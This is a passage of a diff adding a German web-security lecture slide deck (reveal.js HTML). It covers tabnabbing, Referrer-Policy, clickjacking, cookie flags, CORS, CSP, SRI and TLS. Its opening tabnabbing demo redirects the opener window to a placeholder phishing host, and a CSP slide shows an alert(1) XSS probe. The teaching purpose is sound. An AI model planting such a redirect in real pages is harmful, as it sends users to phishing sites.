+<span id="cb51-5"><a href="#cb51-5" aria-hidden="true" tabindex="-1"></a>            <span class="bu">window</span><span class="op">.</span><span class="at">opener</span><span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&#39;https://phish.example.com&#39;</span><span class="op">;</span></span>
+<span id="cb51-6"><a href="#cb51-6" aria-hidden="true" tabindex="-1"></a>      }</span>
+<span id="cb51-7"><a href="#cb51-7" aria-hidden="true" tabindex="-1"></a>   <span class="kw">&lt;/script&gt;</span></span>
+<span id="cb51-8"><a href="#cb51-8" aria-hidden="true" tabindex="-1"></a> <span class="kw">&lt;/body&gt;</span></span>
+<span id="cb51-9"><a href="#cb51-9" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
+</section>
+<section id="gegenmaßnahmen-2" class="slide level2">
+<h2>Gegenmaßnahmen</h2>
+<ul>
+<li>keine externen Webseiten verlinken</li>
+<li>rel=”noopener noreferrer” bei Link verwenden</li>
+</ul>
+<div class="sourceCode" id="cb52"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb52-1"><a href="#cb52-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;a</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;bad-website.com&quot;</span> <span class="er">rel</span><span class="ot">=</span><span class="st">&quot;noopener noreferrer&quot;</span> <span class="er">target</span><span class="ot">=</span><span class="st">&quot;_blank&quot;</span><span class="kw">&gt;</span>Vulnerable target using html link to open the new page<span class="kw">&lt;/a&gt;</span></span>
+<span id="cb52-2"><a href="#cb52-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
+<ul>
+<li>Referrer-Policy setzen (no-referrer)</li>
+</ul>
+</section>
+<section id="referrer-policy" class="slide level2">
+<h2>Referrer-Policy</h2>
+<ul>
+<li>Kontrolliert den Referer-Header des Browsers</li>
+<li>Referer vs Referrer</li>
+</ul>
+</section>
+<section id="mögliche-einstellungen" class="slide level2">
+<h2>Mögliche Einstellungen</h2>
+<table>
+<thead>
+<tr class="header">
+<th>Wert</th>
+<th>Beschreibung</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>no-referrer</td>
+<td>Referer Header wird nie gesetzt</td>
+</tr>
+<tr class="even">
+<td>no-referrer-when-downgrade</td>
+<td>default, no https-&gt;http</td>
+</tr>
+<tr class="odd">
+<td>origin</td>
+<td>nur origin wird gesendet</td>
+</tr>
+<tr class="even">
+<td>origin-when-cross-origin</td>
+<td></td>
+</tr>
+<tr class="odd">
+<td>same-origin</td>
+<td>referrer nur wenn same-origin</td>
+</tr>
+<tr class="even">
+<td>strict-origin</td>
+<td>only set origin, no https-&gt;http</td>
+</tr>
+<tr class="odd">
+<td>strict-origin-when-cross-origin</td>
+<td>new-default (2021)</td>
+</tr>
+<tr class="even">
+<td>unsafe-url</td>
+<td>Referrer immer gesetzt</td>
+</tr>
+</tbody>
+</table>
+</section></section>
+<section>
+<section id="clickjacking-x-frame-options" class="title-slide slide level1">
+<h1>Clickjacking / X-Frame-Options</h1>
+
+</section>
+<section id="angriff" class="slide level2">
+<h2>Angriff</h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/clickjacking">Clickjacking / UI-Redress Attacks</a></li>
+</ul>
+<p><img data-src="./0x09_clickjacking.jpg" /></p>
+</section>
+<section id="x-frame-options" class="slide level2">
+<h2>X-Frame-Options</h2>
+<pre class="http"><code>X-Frame-Options: deny
+X-Frame-Options: sameorigin
+X-Frame-Options: allow-from https://example.com/</code></pre>
+</section>
+<section id="x-frame-options-nachteile" class="slide level2">
+<h2>X-Frame-Options: Nachteile</h2>
+<ul>
+<li>Header nur einmal erlaubt</li>
+<li>mit allow-from kann nur eine Origin angegeben werden</li>
+<li>Double-Framing ist möglich</li>
+<li>Alternative: CSP</li>
+</ul>
+</section></section>
+<section>
+<section id="cookie-flags" class="title-slide slide level1">
+<h1>Cookie-Flags</h1>
+
+</section>
+<section id="allgemein-1" class="slide level2">
+<h2>Allgemein</h2>
+<ul>
+<li>werden beim Setzen des Cookies angegeben</li>
+<li>Setzen passiert per HTTP-Header</li>
+</ul>
+<pre class="http"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</code></pre>
+</section>
+<section id="secure-flag" class="slide level2">
+<h2>Secure-Flag</h2>
+<ul>
+<li>Verwendung des Cookies nur via HTTPS</li>
+</ul>
+<pre class="http"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure</code></pre>
+</section>
+<section id="httponly-flag" class="slide level2">
+<h2>HttpOnly-Flag</h2>
+<ul>
+<li>Zugriff mittels JavaScript wird unterbunden</li>
+<li>Achtung falls HTTP TRACE erlaubt ist</li>
+</ul>
+<pre class="http"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly</code></pre>
+</section>
+<section id="samesite-flag" class="slide level2">
+<h2>sameSite-Flag</h2>
+<ul>
+<li>Kontrolle, wann ein Cookie übertragen wird</li>
+<li>Gegenmassnahme zu CSRF-Angriffen</li>
+</ul>
+</section>
+<section id="csrf-angriffe-1" class="slide level2">
+<h2>CSRF-Angriffe</h2>
+<p><img data-src="./0x06_csrf.png" /></p>
+</section>
+<section id="möglichkeiten" class="slide level2">
+<h2>Möglichkeiten</h2>
+<ul>
+<li>strict: nur bei same-site requestes</li>
+<li>lax (default): bei same-site requests, cross-site wenn navigation von externer Seite</li>
+<li>none: same-site und cross-site, secure muss gesetzt werden</li>
+</ul>
+<pre class="http"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Strict</code></pre>
+</section></section>
+<section>
+<section id="sopcors" class="title-slide slide level1">
+<h1>SOP/CORS</h1>
+
+</section>
+<section id="cross-origin-resource-sharing-cors" class="slide level2">
+<h2>Cross-Origin Resource Sharing (CORS)</h2>
+<p>Aufweichen der SOP</p>
+<p>Beispiel: Browser lädt eine Webseite (web.snikt.net), diese will mittels Javascript auf service.snikt.net zugreifen</p>
+</section>
+<section id="simple-case-read-request" class="slide level2">
+<h2>Simple Case: Read-Request</h2>
+<ul>
+<li>Browser befindet sich auf web.snikt.net</li>
+<li>Will auf service.snikt.net zugreifen</li>
+<li>Setzt dafür den Origin Header beim JS-Zugriff auf service.snikt.net</li>
+</ul>
+<pre class="http"><code>Origin: web.snikt.net</code></pre>
+</section>
+<section id="simple-case-response" class="slide level2">
+<h2>Simple Case: Response</h2>
+<p>Das Antwortdokument des Services beinhaltet einen zusätzlichen Header der anzeigt, wer diese Operation aufrufen darf:</p>
+<pre class="http"><code>Access-Control-Allow-Origin: https://web.snikt.net</code></pre>
+<ul>
+<li>Browser weiss nun, dass er diese Daten verarbeiten darf</li>
+<li>Da dies eine “safe” Operation ist, kann am service-Service nichts geschehen</li>
+<li>Bitte nicht: Access-Control-Allow-Origin: *</li>
+</ul>
+</section>
+<section id="was-bei-daten-verändernden-operationen" class="slide level2">
+<h2>Was bei Daten-Verändernden Operationen?</h2>
+<ul>
+<li>Preflight-Authorisation</li>
+<li>Browser sendet HTTP OPTIONS zum Service</li>
+<li>Origin-Header wird wieder auf web.snikt.net gesetzt</li>
+<li>Beispielsantwort</li>
+</ul>
+<pre class="http"><code>Access-Control-Allow-Origin: https://web.snikt.net
+Access-Control-Allow-Methods: PUT, DELETE</code></pre>
+<ul>
+<li>Danach sendet der Browser erst den Daten-verändernden Request</li>
+</ul>
+</section>
+<section id="zusammengefasst" class="slide level2">
+<h2>Zusammengefasst</h2>
+<img data-src="0x09_cors.png" title="fig:" class="stretch" alt="Picture" />
+</section></section>
+<section>
+<section id="content-security-policy-csp" class="title-slide slide level1">
+<h1>Content-Security-Policy (CSP)</h1>
+
+</section>
+<section id="entstehungsgeschichte" class="slide level2">
+<h2>Entstehungsgeschichte</h2>
+<ul>
+<li>“logische” Erweiterung aus SOP</li>
+<li>SOP: Schützt die eigene Seite vor fremden Zugriffen</li>
+<li>CSP: Definiert wo in der eigenen Seite JavaScript vorkommen darf</li>
+</ul>
+</section>
+<section id="basic-form" class="slide level2">
+<h2>Basic-Form</h2>
+<pre class="http"><code>Content-Security-Policy: &lt;policy-directive&gt;; &lt;policy-directive&gt;</code></pre>
+<p>Report-Only:</p>
+<pre class="http"><code>Content-Security-Policy-Report-Only: &lt;policy-directive&gt;; &lt;policy-directive&gt;</code></pre>
+</section>
+<section id="verhalten-bei-mehreren-headern" class="slide level2">
+<h2>Verhalten bei mehreren Headern</h2>
+<ul>
+<li>nachfolgende Header können zuvorige nur verschärfen</li>
+</ul>
+</section>
+<section id="direktiven-auszug" class="slide level2">
+<h2>Direktiven (Auszug)</h2>
+<ul>
+<li>script-src, style-src, font-src, media-src, img-src, ..</li>
+<li>frame-src, frame-ancestors</li>
+<li>form-action</li>
+<li>base-uri</li>
+<li>upgrade-insecure-requests, block-all-mixed-content</li>
+<li>report-uri</li>
+<li>default-src</li>
+</ul>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Genauere Informationen online</a></p>
+</section>
+<section id="sources-werte-für-direktiven" class="slide level2">
+<h2>Sources (Werte für Direktiven)</h2>
+<ul>
+<li>‘none’</li>
+<li>‘self’</li>
+<li>‘unsafe-inline’, ‘unsafe-eval’, ‘strict-dynamic’</li>
+<li>scheme (http:, https:)</li>
+<li>hostname (e.g., https://snikt.net)</li>
+</ul>
+</section>
+<section id="beispiele-1" class="slide level2">
+<h2>Beispiele</h2>
+<pre><code># resourcen nür über https
+Content-Security-Policy: default-src https:
+
+# Javascript darf nur in getrennten JS-Files am eigenen Server vorkommen:
+Content-Security-Policy: script-src &#39;self&#39;;
+
+# limit fonts und grafiken
+Content-Security-Policy: font-src https://google-fonts.com; img-src &#39;self&#39; https://img.snikt.net;</code></pre>
+</section>
+<section id="xss-protection" class="slide level2">
+<h2>XSS-Protection</h2>
+<pre><code># limit javascript to scripts from scripts.snikt.net
+Content-Security-Policy: script-src https://scripts.snikt.net;</code></pre>
+<p>Auch wenn der Angreifer im HTML-Code Javascript hinterlegen kann, wird es nicht ausgeführt:</p>
+<div class="sourceCode" id="cb65"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb65-1"><a href="#cb65-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;html&gt;</span></span>
+<span id="cb65-2"><a href="#cb65-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">&lt;body&gt;</span></span>
+<span id="cb65-3"><a href="#cb65-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;script&gt;</span><span class="fu">alert</span>(<span class="dv">1</span>)<span class="op">;</span><span class="kw">&lt;/script&gt;</span></span>
+<span id="cb65-4"><a href="#cb65-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;/body&gt;</span></span>
+<span id="cb65-5"><a href="#cb65-5" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
+</section>
+<section id="verwendung-von-javascript" class="slide level2">
+<h2>Verwendung von Javascript</h2>
+<p>Funktioniert nicht mehr:</p>
+<div class="sourceCode" id="cb66"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb66-1"><a href="#cb66-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;button</span> <span class="er">id</span><span class="ot">=</span><span class="st">&#39;my-javascript-button&#39;</span> <span class="er">onclick</span><span class="ot">=</span><span class="st">&quot;alert(&#39;hello&#39;);&quot;</span><span class="kw">&gt;</span></span></code></pre></div>
+</section>
+<section id="verwendung-von-javascript-1" class="slide level2">
+<h2>Verwendung von Javascript</h2>
+<p>Stattdessen: in eigenem Javascript-File:</p>
+<div class="sourceCode" id="cb67"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb67-1"><a href="#cb67-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;button</span> <span class="er">id</span><span class="ot">=</span><span class="st">&#39;my-javascript-button&#39;</span><span class="kw">&gt;</span></span>
+<span id="cb67-2"><a href="#cb67-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://script.snikt.net/somescript.js&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span></code></pre></div>
+<p>somescript.js:</p>
+<div class="sourceCode" id="cb68"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb68-1"><a href="#cb68-1" aria-hidden="true" tabindex="-1"></a><span class="fu">$</span>(<span class="bu">document</span>)<span class="op">.</span><span class="fu">ready</span>(<span class="kw">function</span> () {</span>
+<span id="cb68-2"><a href="#cb68-2" aria-hidden="true" tabindex="-1"></a>  <span class="fu">$</span>(<span class="st">&#39;#my-javascript-button&#39;</span>)<span class="op">.</span><span class="fu">on</span>(<span class="st">&#39;click&#39;</span><span class="op">,</span> <span class="kw">function</span>() {</span>
+<span id="cb68-3"><a href="#cb68-3" aria-hidden="true" tabindex="-1"></a>        <span class="fu">alert</span>(<span class="st">&#39;hello&#39;</span>)<span class="op">;</span></span>
+<span id="cb68-4"><a href="#cb68-4" aria-hidden="true" tabindex="-1"></a>    })<span class="op">;</span></span>
+<span id="cb68-5"><a href="#cb68-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+</section>
+<section id="problem-user-sollte-nicht-js-file-hochladen-können" class="slide level2">
+<h2>Problem: User sollte nicht JS-File hochladen können</h2>
+<ul>
+<li>File-Uploads?</li>
+<li><a href="https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs">Bypassing CSP using polyglot files</a></li>
+</ul>
+</section>
+<section id="negative-shortcuts" class="slide level2">
+<h2>Negative Shortcuts</h2>
+<p>‘unsafe-inline’ und ‘unsafe-eval’ entfernen viel von der Schutzwirkung..</p>
+<pre class="http"><code>Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;</code></pre>
+</section>
+<section id="csp-is-hard" class="slide level2">
+<h2>CSP is hard</h2>
+<p><a href="https://www.youtube.com/watch?v=jeTGBSL4eQs">Restricting The Scripts, You’re To Blame, You Give CSP a Bad name</a></p>
+</section>
+<section id="reporting-12" class="slide level2">
+<h2>Reporting 1/2</h2>
+<pre class="http"><code>Content-Security-Policy-Report-Only: default-src &#39;none&#39;; style-src cdn.example.com; report-uri: /csp-reports</code></pre>
+<div class="sourceCode" id="cb71"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb71-1"><a href="#cb71-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE </span>html<span class="dt">&gt;</span></span>
+<span id="cb71-2"><a href="#cb71-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;html&gt;</span></span>
+<span id="cb71-3"><a href="#cb71-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;head&gt;</span></span>
+<span id="cb71-4"><a href="#cb71-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">&lt;title&gt;</span>Sign Up<span class="kw">&lt;/title&gt;</span></span>
+<span id="cb71-5"><a href="#cb71-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">&lt;link</span> <span class="er">rel</span><span class="ot">=</span><span class="st">&quot;stylesheet&quot;</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;css/style.css&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb71-6"><a href="#cb71-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;/head&gt;</span></span>
+<span id="cb71-7"><a href="#cb71-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;body&gt;</span></span>
+<span id="cb71-8"><a href="#cb71-8" aria-hidden="true" tabindex="-1"></a>        ... Content ...</span>
+<span id="cb71-9"><a href="#cb71-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;/body&gt;</span></span>
+<span id="cb71-10"><a href="#cb71-10" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
+</section>
+<section id="reporting-22" class="slide level2">
+<h2>Reporting 2/2</h2>
+<div class="sourceCode" id="cb72"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb72-1"><a href="#cb72-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb72-2"><a href="#cb72-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;csp-report&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb72-3"><a href="#cb72-3" aria-hidden="true" tabindex="-1"></a>        <span class="dt">&quot;document-uri&quot;</span><span class="fu">:</span> <span class="st">&quot;http://example.com/signup.html&quot;</span><span class="fu">,</span></span>
+<span id="cb72-4"><a href="#cb72-4" aria-hidden="true" tabindex="-1"></a>            <span class="dt">&quot;referrer&quot;</span><span class="fu">:</span> <span class="st">&quot;&quot;</span><span class="fu">,</span></span>
+<span id="cb72-5"><a href="#cb72-5" aria-hidden="true" tabindex="-1"></a>            <span class="dt">&quot;blocked-uri&quot;</span><span class="fu">:</span> <span class="st">&quot;http://example.com/css/style.css&quot;</span><span class="fu">,</span></span>
+<span id="cb72-6"><a href="#cb72-6" aria-hidden="true" tabindex="-1"></a>            <span class="dt">&quot;violated-directive&quot;</span><span class="fu">:</span> <span class="st">&quot;style-src cdn.example.com&quot;</span><span class="fu">,</span></span>
+<span id="cb72-7"><a href="#cb72-7" aria-hidden="true" tabindex="-1"></a>            <span class="dt">&quot;original-policy&quot;</span><span class="fu">:</span> <span class="st">&quot;default-src &#39;none&#39;; style-src cdn.example.com; report-uri /_/csp-reports&quot;</span><span class="fu">,</span></span>
+<span id="cb72-8"><a href="#cb72-8" aria-hidden="true" tabindex="-1"></a>            <span class="dt">&quot;disposition&quot;</span><span class="fu">:</span> <span class="st">&quot;report&quot;</span></span>
+<span id="cb72-9"><a href="#cb72-9" aria-hidden="true" tabindex="-1"></a>    <span class="fu">}</span></span>
+<span id="cb72-10"><a href="#cb72-10" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+</section>
+<section id="csp-with-google-nonces-since-2015" class="slide level2">
+<h2><a href="https://csp.withgoogle.com">CSP with Google</a>: Nonces (since 2015)</h2>
+<p>Nonce: zufälliger nicht-erratenbarer Wert, wird per CSP definiert</p>
+<pre class="http"><code>Content-Security-Policy: script-src &#39;nonce-r@nd0m&#39;;</code></pre>
+<p>Script-Tags werden ausgeführt, wenn sie den korrekten Nonce verwenden:</p>
+<div class="sourceCode" id="cb74"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb74-1"><a href="#cb74-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script</span> <span class="er">nonce</span><span class="ot">=</span><span class="st">&quot;r@nd0m&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb74-2"><a href="#cb74-2" aria-hidden="true" tabindex="-1"></a>    <span class="fu">doWhatever</span>()<span class="op">;</span></span>
+<span id="cb74-3"><a href="#cb74-3" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/script&gt;</span></span></code></pre></div>
+</section>
+<section id="csp-with-google" class="slide level2">
+<h2>CSP-with-Google</h2>
+<pre class="http"><code>Content-Security-Policy: default-src https:; script-src &#39;nonce-{random}&#39;; object-src &#39;none&#39;</code></pre>
+<blockquote>
+<p>This policy will require all resources to be loaded over HTTPS, allow only script elements with the correct nonce attribute, and prevent loading any plugins.</p>
+</blockquote>
+</section>
+<section id="csp-with-google-strict-csp" class="slide level2">
+<h2><a href="https://csp.withgoogle.com/docs/strict-csp.html#example">CSP-with-Google</a>: strict-CSP</h2>
+<pre class="http"><code>Content-Security-Policy:
+  object-src &#39;none&#39;;
+    script-src &#39;nonce-{random}&#39; &#39;unsafe-inline&#39; &#39;strict-dynamic&#39; https: http:;</code></pre>
+<ul>
+<li>unsafe-inline wird von neueren Browsern deaktiviert, falls nonce gesetzt</li>
+<li>strict-dynamic erlaubt das indirekte Laden von javascript, disabled http: und https:</li>
+<li>ganz alte browser fallen also auf http: und https: zurück</li>
+</ul>
+</section>
+<section id="csp-scanner" class="slide level2">
+<h2>CSP-Scanner</h2>
+<ul>
+<li>Viele Scanner analysieren bereits CSP Direktiven</li>
+<li><a href="https://cspscanner.com/">CSPScanner</a></li>
+<li><a href="https://csp-evaluator.withgoogle.com/">Google CSP Evaluator</a></li>
+<li><a href="https://report-uri.com/home/generate">CSP Generator</a></li>
+</ul>
+</section></section>
+<section>
+<section id="html-directives" class="title-slide slide level1">
+<h1>HTML-Directives</h1>
+
+</section>
+<section id="iframe-option-sandbox" class="slide level2">
+<h2>IFrame-Option: sandbox</h2>
+<ul>
+<li>all forms and scripts are disabled</li>
+<li>all links are not allowed to target other browser contexts</li>
+<li>all plugins are disabled</li>
+<li>all features that trigger automatically are disabled</li>
+</ul>
+</section>
+<section id="subresource-integrity" class="slide level2">
+<h2>Subresource Integrity</h2>
+<ul>
+<li>Dient um indirekte Angriffe z. B. über CDNs abzuwehren</li>
+<li>Hash-Summe wird bei script/css includes angegeben,</li>
+<li>Verwendung kann mittels CSP enforced werden</li>
+</ul>
+<div class="sourceCode" id="cb77"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb77-1"><a href="#cb77-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;script</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://example.com/example-framework.js&quot;</span></span>
+<span id="cb77-2"><a href="#cb77-2" aria-hidden="true" tabindex="-1"></a><span class="ot">      integrity=</span><span class="st">&quot;sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC&quot;</span><span class="kw">&gt;&lt;/script&gt;</span></span></code></pre></div>
+</section>
+<section id="sri-probleme" class="slide level2">
+<h2>SRI: Probleme</h2>
+<ul>
+<li>nicht transitiv</li>
+<li>dynamische Inhalte wie Google Fonts</li>
+<li>keine “gratis” Updates von Libraries</li>
+</ul>
+</section></section>
+<section>
+<section id="html5-stuff" class="title-slide slide level1">
+<h1>HTML5 Stuff</h1>
+
+</section>
+<section id="webstorage" class="slide level2">
+<h2>WebStorage</h2>
+<ul>
+<li>SessionStorage vs. LocalStorage</li>
+<li>Verwundbar gegenüber XSS (verglichen mit Cookies)
+<ul>
+<li>no-na-net</li>
+<li>es gibt kein httpOnly</li>
+<li>man kann es nicht auf sub-Pfade limitieren</li>
+</ul></li>
+<li>niemals sensitive Informationen speichern</li>
+</ul>
+</section>
+<section id="webworkers" class="slide level2">
+<h2>WebWorkers</h2>
+<ul>
+<li>Achtung wenn User-Eingaben verwendet werden</li>
+<li>können XMLHttpRequests abschicken, aber getrennter Origin</li>
+<li>CPU DoS!</li>
+</ul>
+</section>
+<section id="webasm" class="slide level2">
+<h2>WebAsm</h2>
+<ul>
+<li>Potential für Bitcoin-Miners</li>
+<li>Potential für Obfuscation</li>
+</ul>
+</section>
+<section id="webrtc" class="slide level2">
+<h2>WebRTC</h2>
+<ul>
+<li>Peer-to-Peer Communication</li>
+<li>Access to Camera/Mic through Browser Controls</li>
+<li>Eher Privacy Impact</li>
+</ul>
+</section>
+<section id="webbluetooth" class="slide level2">
+<h2>WebBluetooth</h2>
+<ul>
+<li>Browser soll mit verbundenen Bluetooth LE devices Daten austauschen können.</li>
+<li>Webseite kann nicht nach devices suchen</li>
+<li>JS requested device, Browser übernimmt das Pairing</li>
+<li>Effektiv sehr vergleichbar mit Security Model mobiler Applikationen</li>
+</ul>
+</section>
+<section id="webbluetooh-privacy-impact" class="slide level2">
+<h2>WebBluetooh: Privacy Impact</h2>
+<ul>
+<li>Only possible from Secure Context (HTTPS)</li>
+<li>Eher Privacy Impact</li>
+<li>“rssi”, “txPower”</li>
+</ul>
+</section>
+<section id="webserial-und-webusb" class="slide level2">
+<h2>WebSerial und WebUSB</h2>
+<ul>
+<li>why o why?</li>
+</ul>
+</section></section>
+<section>
+<section id="httpstls" class="title-slide slide level1">
+<h1>HTTPS/TLS</h1>
+
+</section>
+<section id="httpstls-guidelines" class="slide level2">
+<h2>HTTPS/TLS: Guidelines</h2>
+<ul>
+<li>TLSv1.2 (oder TLSv1.3) mit AES-GCM
+<ul>
+<li><a href="https://datatracker.ietf.org/doc/rfc8996/?include_text=1">RFC8996</a></li>
+<li>Ältere Verfahren verwenden unsichere Krypto</li>
+<li>aktuelle Browser bieten nur TLSv1.2 an</li>
+</ul></li>
+<li>Vorzugsweise HTTP/2</li>
+</ul>
+</section>
+<section id="https-details" class="slide level2">
+<h2>HTTPS-Details</h2>
+<ul>
+<li>HSTS verwenden</li>
+<li>Perfect Forward Secrecy anbieten</li>
+<li>Alle Kommunikationswege müssen ident abgesichert sein
+<ul>
+<li>Problem: interne vs. externe Kommunikation</li>
+</ul></li>
+</ul>
+</section>
+<section id="hsts" class="slide level2">
+<h2>HSTS</h2>
+<ul>
+<li>HTTP Strict Transport Security</li>
+<li>all future requests must use HTTPS</li>
+<li>automatic upgrade from HTTP to HTTPS</li>
+<li>user is prevented from accessing the site over HTTP</li>
+</ul>
+<pre><code>Strict-Transport-Security: max-age=31536000, includeSubdomain, preload</code></pre>
+</section>
+<section id="httptls-howto-test" class="slide level2">
+<h2>HTTP/TLS: Howto test</h2>
+<ul>
+<li><a href="https://testssl.sh/">testssl.sh</a></li>
+<li><a href="https://www.ssllabs.com/ssltest/">Qualys SSL Test</a></li>
+<li><a href="https://bettercrypto.org/">bettercrypto.org</a></li>
+</ul>
+</section></section>
+<section>
+<section id="misconfiguration-minimalprinzip" class="title-slide slide level1">
+<h1>Misconfiguration / Minimalprinzip</h1>
+
+</section>
+<section id="beispiel-von-software-die-man-nicht-am-server-haben-will" class="slide level2">
+<h2>Beispiel von Software, die man nicht am Server haben will:</h2>
+<ul>
+<li>Entwicklungstools wie phpmyadmin</li>
+<li>Debug Mode/Toolbars bei verwendeten Frameworks</li>
+<li>Stacktraces mit Detailinformationen</li>
+<li>phpinfo.php</li>
+<li>Beispielscode (/example Directory)</li>
+</ul>
+</section>
+<section id="beispiel-von-meta-daten-die-man-nicht-haben-will" class="slide level2">
+<h2>Beispiel von Meta-Daten, die man nicht haben will:</h2>
+<ul>
+<li>.git, .svn Verzeichnisse</li>
+<li>Backup files (.bak, .tmp)</li>
+<li>Private Schlüssel, etc. im Dateisystem</li>
+<li>Credentials im Dateisystem oder in Repositories</li>
+<li>Backups</li>
+</ul>
+</section>
+<section id="configuration-and-credential-management" class="slide level2">
+<h2>Configuration and Credential Management</h2>
+<ul>
+<li>nicht hard-coded</li>
+<li>Alternativen:
+<ul>
+<li>.env Files</li>
+<li>Framework-Features</li>
+<li>Vault</li>
+</ul></li>
+</ul>
+</section></section>
+<section>
+<section id="using-components-with-known-vulnerabilities" class="title-slide slide level1">
+<h1>Using Components with known Vulnerabilities</h1>
+
+</section>
+<section id="components-with-vulnerabilities" class="slide level2">
+<h2>Components with Vulnerabilities</h2>
+<ul>
+<li>Komponenten müssen regelmäßig getestet werden</li>
+<li>..und dann auch ausgebessert</li>
+</ul>
+</section>
+<section id="wie-kann-dies-automatisiert-überprüft-werden" class="slide level2">
+<h2>Wie kann dies automatisiert überprüft werden</h2>
+<ul>
+<li><a href="https://owasp.org/www-project-dependency-check/">OWASP dependency-check</a>, <a href="https://retirejs.github.io/retire.js/">retire.js</a></li>
+<li><a href="https://dependencytrack.org/">OWASP dependency-track</a></li>
+</ul>
+</section>
+<section id="supply-chain-attacks" class="slide level2">
+<h2>Supply-Chain Attacks</h2>
+<ul>
+<li>Typo-Squatting</li>
+<li>Dependency-Confusion</li>
+</ul>
+</section></section>
+<section>
+<section id="logging-monitoring" class="title-slide slide level1">
+<h1>Logging / Monitoring</h1>
+
+</section>
+<section id="basics" class="slide level2">
+<h2>Basics</h2>
+<ul>
+<li>Kontroverse bei OWASP Top 10 2017</li>
+<li>Es sollte möglich sein automatisierte Angriffe zu erkennen</li>
+<li>Spätere Auswertung sollte möglich sein</li>
+<li>Betrifft im Webserver Umfeld vor allem Webserver- und Applikationslogs</li>
+</ul>
+</section>
+<section id="anforderungen" class="slide level2">
+<h2>Anforderungen</h2>
+<ul>
+<li>Zentralisiert (weil mehrere app server, db server, etc.)</li>
+<li>Secure (Integrität, Vertraulichkeit, Verfügbarkeit)</li>
+<li>Auswertbar</li>
+</ul>
+</section></section>
+<section id="fin" class="title-slide slide level1">
+<h1>FIN</h1>
+
+</section>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/reveal.js@4.1.3//dist/reveal.js"></script>
+
+  <!-- reveal.js plugins -->
+  <script src="https://unpkg.com/reveal.js@4.1.3//plugin/notes/notes.js"></script>
+  <script src="https://unpkg.com/reveal.js@4.1.3//plugin/search/search.js"></script>
+  <script src="https://unpkg.com/reveal.js@4.1.3//plugin/zoom/zoom.js"></script>
+
+  <script>
+
+      // Full list of configuration options available at:
+      // https://revealjs.com/config/
+      Reveal.initialize({
+        // Display controls in the bottom right corner
+        controls: true,
+
+        // Help the user learn the controls by providing hints, for example by
+        // bouncing the down arrow when they first encounter a vertical slide
+        controlsTutorial: true,
+
+        // Determines where controls appear, "edges" or "bottom-right"
+        controlsLayout: 'bottom-right',
+
+        // Visibility rule for backwards navigation arrows; "faded", "hidden"
+        // or "visible"
+        controlsBackArrows: 'faded',
+
+        // Display a presentation progress bar
+        progress: true,
+
+        // Display the page number of the current slide
+        slideNumber: false,
+
+        // 'all', 'print', or 'speaker'
+        showSlideNumber: 'all',
+
+        // Add the current slide number to the URL hash so that reloading the
+        // page/copying the URL will return you to the same slide
+        hash: false,
+
+        // Start with 1 for the hash rather than 0
+        hashOneBasedIndex: false,
+
+        // Flags if we should monitor the hash and change slides accordingly
+        respondToHashChanges: true,
+
+        // Push each slide change to the browser history
